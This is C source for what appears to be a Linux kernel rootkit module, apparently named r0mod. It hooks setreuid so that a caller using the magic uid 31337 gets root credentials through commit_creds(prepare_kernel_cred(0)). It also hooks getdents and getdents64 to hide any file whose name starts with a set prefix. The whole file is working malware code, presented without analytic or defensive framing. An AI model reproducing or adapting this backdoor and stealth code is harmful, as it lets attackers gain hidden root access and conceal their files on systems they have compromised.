#include <linux/cred.h>

#include <config.h>
#include <r0mod/global.h>
#include <linux/uaccess.h>
#include <asm/uaccess.h>

// Commander
asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    DEBUG("[trying]: ruid == %d && euid == %d\n", ruid, euid);

    if(ruid == 31337)
    {
        switch(euid)
        {
            case CMD_ROOT:
                commit_creds(prepare_kernel_cred(0));
                return new_setreuid(0, 0);
            break;
        }
    }

    return orig_setreuid(ruid, euid);
}

asmlinkage int (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
    int ret, i, j;
    char *buf, *userp;
    mm_segment_t old_fs;

    struct linux_dirent *p;

    // Cast dirp into byte array so we can manipulate pointers at the byte level
    userp = (char *)dirp;

    buf = kmalloc(count, GFP_KERNEL);
    if(!buf)
        return -ENOBUFS;

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = orig_getdents(fd, (struct linux_dirent *)buf, count);
    set_fs(old_fs);

    for(i = j = 0; i < ret; i += p->d_reclen)
    {
        p = (struct linux_dirent *)(buf + i);

        // Skip over hidden files
        if(strncmp(p->d_name, HIDDEN_PREFIX, sizeof(HIDDEN_PREFIX) - 1) == 0)
            continue;

        if(copy_to_user(userp + j, p, p->d_reclen))
        {
            ret = -EAGAIN;
            goto end;
        }

        j += p->d_reclen;
    }

    // Our call to the orig getdents succeeded, return after we've hidden files
    if(ret > 0)
        ret = j;

end:
    kfree(buf);

    return ret;
}

asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    int ret, i, j;
    char *buf, *userp;
    mm_segment_t old_fs;

    struct linux_dirent64 *p;

    // Cast dirp into byte array so we can manipulate pointers at the byte level
    userp = (char *)dirp;

    buf = kmalloc(count, GFP_KERNEL);
    if(!buf)
        return -ENOBUFS;

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = orig_getdents64(fd, (struct linux_dirent64 *)buf, count);
    set_fs(old_fs);

    for(i = j = 0; i < ret; i += p->d_reclen)
    {
        p = (struct linux_dirent64 *)(buf + i);

        // Skip over hidden files
        if(strncmp(p->d_name, HIDDEN_PREFIX, sizeof(HIDDEN_PREFIX) - 1) == 0)
            continue;

        if(copy_to_user(userp + j, p, p->d_reclen))
        {
            ret = -EAGAIN;
            goto end;
        }

        j += p->d_reclen;
    }

    // Our call to the orig getdents succeeded, return after we've hidden files
    if(ret > 0)
        ret = j;

end:
    kfree(buf);

    return ret;
}
